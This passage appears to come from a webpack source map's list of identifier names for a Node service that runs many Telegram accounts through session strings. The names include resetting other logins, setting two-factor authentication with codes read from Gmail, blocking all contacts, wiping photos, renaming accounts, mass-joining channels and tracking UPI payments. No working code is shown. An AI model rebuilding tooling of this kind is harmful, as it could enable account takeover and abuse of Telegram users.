d","toString","findOne","insertOne","getChannels","limit","skip","k","query","$ne","sort","$regex","$options","options","collation","locale","strength","createIndex","find","toArray","insertUser","user","mobile","updateUser","updateOne","$set","upsert","deleteUser","deleteOne","getUser","getTempUser","getUsersFullData","_id","insertInBufferClients","bufferColl","readBufferClients","queryWithLimit","getOneBufferClient","deleteBufferClient","getNewBufferClients","ids","$nin","twoFA","$exists","lastActive","readPromoteStats","promotColl","projection","totalCount","readSinglePromoteStats","clientId","readStats","newUser","read","chatId","removeOnefromChannel","e","getUsers","firstName","userName","getupi","upiDb","getAllUpis","updateUpis","getBuilds","buildBd","updateBuilds","getUserConfig","clientDb","updateUserConfig","findOneAndUpdate","returnOriginal","value","insertInAchivedClient","number","getInAchivedClient","getAllUserClients","aggregate","$project","getTgConfig","updateTgConfig","processUsers","clearStats","deleteMany","$lt","clearStats2","clearPromotionStats","closeConnection","close","getCurrentActiveUniqueChannels","cursor","uniqueChannels","Set","document","channel","add","initPromoteStats","obj","lastupdatedTimeStamp","Date","now","getActiveChannels","keywords","notIds","pattern","RegExp","join","notPattern","$and","$or","$not","promoteStatsColl","updateActiveChannels","activeChannelCollection","uniqueChannelNames","channelInfoCollection","channelName","channelInfo","removeOnefromActiveChannel","Imap","isReady","imap","GMAIL_ADD","password","GMAIL_PASS","host","port","tls","tlsOptions","rejectUnauthorized","once","getcode","cb","openBox","fetchOptions","bodies","markSeen","search","results","fetch","msg","seqno","emailData","stream","info","buffer","chunk","which","push","seq","addFlags","expunge","inputString","regex","matches","match","fetchNumbersFromString","openInbox","end","isMailReady","connectToMail","disconnectfromMail","swaggerSpec","swaggerJsdoc","definition","openapi","version","description","apis","TelegramClient","Api","NewMessage","axios","StringSession","CustomFile","sleep","clients","activeClientSetup","getClient","deleteClient","cli","disconnect","delete","TelegramManager","sessionString","phoneNumber","session","expired","channelArray","destroy","createClient","autoDisconnect","parseInt","API_ID","API_HASH","connectionRetries","myMsgs","getMessages","setTimeout","connected","setInterval","addEventHandler","event","handleEvents","chats","getDialogs","msgs","total","getLastMsgs","resp","text","sendIds","canSendTrueCount","canSendFalseCount","chat","isChannel","isGroup","chatEntity","entity","toJSON","chatsArrayLength","joinChannels","str","channels","i","trim","invoke","JoinChannel","getEntity","restricted","canSendMsgs","replace","startsWith","includes","removeOtherAuths","updatedAuthorizations","account","GetAuthorizations","authorizations","auth","country","toLowerCase","deviceModel","appName","ResetAuthorization","hash","Boolean","getAuths","hasPassword","GetPassword","blockAllUsers","isUser","blockAUser","contacts","Block","getLastActiveTime","latest","dateActive","getMe","deleteProfilePhotos","photos","GetUserPhotos","userId","DeletePhotos","set2fa","intervalParentId","clearInterval","updateTwoFaSettings","isCheckPassword","email","hint","newPassword","emailCodeCallback","retry","intervalId","code","onEmailCodeError","updatePrivacyforDeletedAccount","SetPrivacy","InputPrivacyKeyPhoneCall","rules","InputPrivacyValueDisallowAll","InputPrivacyKeyProfilePhoto","InputPrivacyValueAllowAll","InputPrivacyKeyPhoneNumber","InputPrivacyKeyStatusTimestamp","InputPrivacyKeyAbout","updateProfile","about","UpdateProfile","lastName","updateUsername","baseUsername","newUserName","increment","UpdateUsername","CheckUsername","message","errorMessage","updateProfilePic","image","file","uploadFile","statSync","size","workers","UploadProfilePhoto","updatePrivacy","isPrivate","payload","post","response","revoke","hasClient","has","disconnectAll","getActiveClientSetup","setActiveClientSetup","ms","maxRetries","timeout","source","CancelToken","cancel","retryCount","cancelToken","token","clearTimeout","isCancel","__webpack_module_cache__","__webpack_require__","moduleId","cachedModule","__webpack_modules__","express","schedule","timeOptions","timeZone","timeZoneName","bodyParser","swaggerUi","execSync","reason","promise","cors","app","userMap","ip","upiIds","pings","output","checkerclass","getinstance","setUserMap","ppplbot","apiResp","apikey","clear","repl","timeStamp","deployKey","downTime","lastPingTime","connetionQueue","scheduleJob","checkBufferClients","values","getUTCDate","joinchannels","joinchannelForBufferClients","use","json","serve","setup","req","next","send","params","hasNext","date","toISOString","me","totalChats","tgId","lastUpdated","exit","body","settingupClient","archieveOld","a","oldClient","oldClienttg","oldClientUser","newClient","userCaps","toUpperCase","slice","newUsername","existingData","setNewClient","generateNewSession","setUpClient","updateClient","refresTime","setHeader","profileData","createInitializedObject","entry","count","payAmount","demoGivenToday","demoGiven","profile","secondShow","userData","totalPaid","totalOldPaid","oldPaidDemo","totalpendingDemos","oldPendingDemos","names","fullShowPPl","fullShowNames","totalNew","totalNewPaid","newPaidDemo","newPendingDemos","profileDataArray","Object","b","reply","reply2","getPromotionStats","getData","userValues","queries","newQuery","keys","dnsMsg","encodeURIComponent","callingTime","upi","upiId","userConfig","tgConfig","Number","toFixed","userdata","cmd","getPromotionStatsHtml","clientobj","restart","num","processId","toLocaleString","connectResp","ProcessId","existingIndex","findIndex","pushToconnectionQueue","listen","main","status","lastUpdatedTimeStamp","goodIds","badIds","pop","addNewUserstoBufferClients","mainAccount","client2","updatedClient"],"sourceRoot":""}